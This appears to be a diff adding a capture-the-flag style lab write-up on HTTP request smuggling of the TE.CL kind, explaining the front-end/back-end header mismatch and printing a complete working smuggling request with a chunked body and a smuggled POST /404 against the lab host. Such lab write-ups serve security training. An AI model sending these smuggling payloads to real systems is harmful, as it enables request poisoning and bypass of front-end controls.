@@ -1,0 +1,56 @@
+// Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
+
+
+This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.
+
+To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
+
+
+
+
+// Solution
+
+// In this lab we can see:
+
+TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. 
+
+
+             // STEPS TO SOLVE 
+
+1. Intercept the / request and send it to Repeater and in that change the HTTP Settings to HTTP 1.1.
+
+2. Then The request should look like the given request and lab will be solved.
+
+
+POST / HTTP/1.1
+
+Host: 0a6400b10306084c83b67ddb00dd00d7.web-security-academy.net
+
+Cookie: session=HqoMCaxy2wMAux4FheYhb8jnGCpacn4L
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-length: 4
+
+Transfer-Encoding: chunked
+
+
+
+5e
+
+POST /404 HTTP/1.1
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 15
+
+
+
+x=1
+
+0
+
+
+
+
+
